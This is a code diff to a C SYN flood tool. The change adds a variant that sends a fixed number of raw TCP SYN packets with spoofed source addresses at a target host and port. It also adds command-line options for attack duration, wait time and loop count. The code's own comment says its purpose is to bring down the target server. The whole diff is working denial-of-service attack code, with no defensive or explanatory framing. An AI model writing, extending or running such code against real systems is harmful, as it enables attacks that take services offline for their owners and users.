@@ -1,11 +1,16 @@
 
 #include "synflood.h"
+#include<time.h>
+
 
 bool attack = true;
 struct in_addr current_ipv4_addr;
 
 extern bool enable_sniffer;  /* Defined in cli.c */
 extern bool enable_spoofing;  /* Defined in cli.c */
+extern bool enable_attack_time;  /* Defined in cli.c */
+extern bool enable_wait_time;  /* Defined in cli.c */
+extern bool enable_loop_count;  /* Defined in cli.c */
 
 void
 sigalrm_handler (int signo)
@@ -123,7 +128,7 @@ pseudoHeaderTcpChecksum (struct iphdr *ip_headers, struct tcphdr *tcp_headers)
  * with spoofed IP addresses.
 */
 void
-synflood (char *hostname, unsigned int port, struct sockaddr_in host_addr)
+synflood_t (char *hostname, unsigned int port, struct sockaddr_in host_addr)
 {
   int sockfd = getRawSocket();
 
@@ -141,6 +146,41 @@ synflood (char *hostname, unsigned int port, struct sockaddr_in host_addr)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
     memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
   }
+}
+
+
+/**
+ * Bring down the target (host) server with a flood of TCP SYN packets
+ * with spoofed IP addresses.
+*/
+void
+synflood_c (char *hostname, unsigned int port, struct sockaddr_in host_addr, unsigned int loop )
+{
+  int sockfd = getRawSocket();
+
+  uint8_t packet[PACKET_BUFFER_LEN];
+  struct iphdr *ip_headers = (struct iphdr *) packet;
+  struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
+  int i ; 
+
+  for ( i=0; i<loop; i++ )  {
+    /* Because we want to spoof the IP address and port number of each packet, we will need to
+     * reconstruct the packet each time we want to send one. */
+    setIpHeaders(ip_headers, &host_addr.sin_addr);
+    setTcpHeaders(tcp_headers, host_addr.sin_port);
+    tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
+    if (sendto(sockfd, packet, PACKET_BUFFER_LEN, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
+      die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
+    memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
+  }
+
+  struct timeval time;
+  gettimeofday(&time, NULL);
+  int64_t s1 = (int64_t)(time.tv_sec) * 1000;
+  int64_t s2 = (time.tv_usec );
+
+  vlog ( "%6d.%6d last attack \n" , (int)s1 , (int)s2 ) ; 
+  /* sleep ( 5 ) ; */ 
 }
 
 
@@ -166,9 +206,10 @@ main (int argc, char *argv[], char *envp[])
   unsigned short int port;
   unsigned int attack_time;
   unsigned int wait_time;
+  unsigned int loop_count ;
   struct sockaddr_in host_addr;
   char hostname[HOSTNAME_BUFFER_LENGTH];
-  getOptions(argc, argv, hostname, &port, &host_addr, &attack_time, &wait_time);
+  getOptions(argc, argv, hostname, &port, &host_addr, &attack_time, &wait_time, &loop_count );
   current_ipv4_addr = getCurrentIpAddr();
   char current_ipv4_addr_buf[32];
   strcpy(current_ipv4_addr_buf, inet_ntoa(current_ipv4_addr));
@@ -176,13 +217,20 @@ main (int argc, char *argv[], char *envp[])
   target hostname:        %s\n\
   target address:         %s\n\
   target port:            %d\n\
+  enabled attack time:    %d\n\
   attack time:            %u %s\n\
   sniffer:                %s\n\
   spoofing:               %s\n\
+  enabled wait time:      %u\n\
+  wait time:              %u\n\
+  enabled loop count:     %u\n\
+  loop count:             %u\n\
   own address:            %s\n",
-       hostname, inet_ntoa(host_addr.sin_addr), port, attack_time,
+       hostname, inet_ntoa(host_addr.sin_addr), port, 
+       enable_attack_time , attack_time,
        attack_time == 1 ? "second" : "seconds", enable_sniffer ? "enabled" : "disabled",
-       enable_spoofing ? "enabled" : "disabled", current_ipv4_addr_buf);
+       enable_spoofing ? "enabled" : "disabled", 
+       enable_wait_time , wait_time , enable_loop_count , loop_count , current_ipv4_addr_buf);
 
   if (enable_sniffer) {
     pid = fork();
@@ -193,9 +241,18 @@ main (int argc, char *argv[], char *envp[])
   vlog("Commencing attack in %d %s.\n", SUSPENSE_TIME, SUSPENSE_TIME == 1 ? "second" : "seconds");
   sleep(SUSPENSE_TIME);
 
-  alarm(attack_time);
-  synflood(hostname, port, host_addr);
-  vlog("waiting time : %d %s \n", wait_time, wait_time == 1 ? "second" : "seconds");
+  /* vlog("waiting time : %d %s \n", wait_time, wait_time == 1 ? "second" : "seconds");
+  vlog("loop count : %d \n" , loop_count ) ; */ 
+
+  if ( enable_attack_time ) {
+      alarm(attack_time);
+      synflood_t (hostname, port, host_addr);
+  } ; 
+
+  if ( enable_loop_count ) {
+      synflood_c (hostname, port, host_addr, loop_count );
+  } ; 
+
   sleep(wait_time);
   vlog("job finished \n" ) ; 
   
